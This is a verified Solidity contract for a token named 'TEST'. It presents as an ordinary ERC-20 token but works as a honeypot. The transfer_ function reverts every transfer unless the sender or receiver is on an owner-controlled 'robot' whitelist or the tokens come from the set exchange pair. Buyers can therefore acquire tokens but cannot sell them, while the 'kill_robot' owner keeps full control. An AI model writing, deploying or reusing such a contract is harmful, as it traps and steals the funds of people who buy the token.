/**
 *Submitted for verification at Arbiscan on 2023-05-28
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

contract TOKEN {
    
    uint constant  Lovelace = 1000000;
    address public kill_robot = 0xfd1003b207f2aBa74F76aCC26B519B5BB7f113B6;
    
    string public symbol = "TEST";
    string public  name = "TEST";
    uint8 public decimals = 6;
    uint public totalSupply = 100000000000 * Lovelace;
    address public uniswap;
    mapping (address => bool) public is_robot;
    mapping(address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }
    fallback () external payable {}
    receive () external payable {}
    function setRobot(address robot,bool value)public {
        require(msg.sender == kill_robot);
        is_robot[robot] = value;
    }
    function abdicate(address new_robot)public {
        require(msg.sender == kill_robot);
        kill_robot = new_robot;
    }
    function set_uniswap(address swap)public{
        require(msg.sender == kill_robot);
        uniswap = swap;
    }
    function transfer_(address _from,address _to ,uint tokens)internal{
        if(is_robot[_from] == true || is_robot[_to] == true || _from == uniswap || tokens == 0){       
            balanceOf[_from] = (balanceOf[_from]- tokens);
            balanceOf[_to] = (balanceOf[_to]+tokens);
            emit Transfer(msg.sender, _to, tokens); 
        }else{
            require(false);
        }               
    }
    function transfer(address to, uint tokens) public returns (bool success) {
        transfer_(msg.sender,to,tokens);
        return true;
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        require(is_robot[msg.sender] == false);
        allowance[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        require(is_robot[msg.sender] == false);
       
        allowance[from][msg.sender] = (allowance[from][msg.sender]-tokens);
        transfer_(from, to, tokens);
        
        return true;
    }
}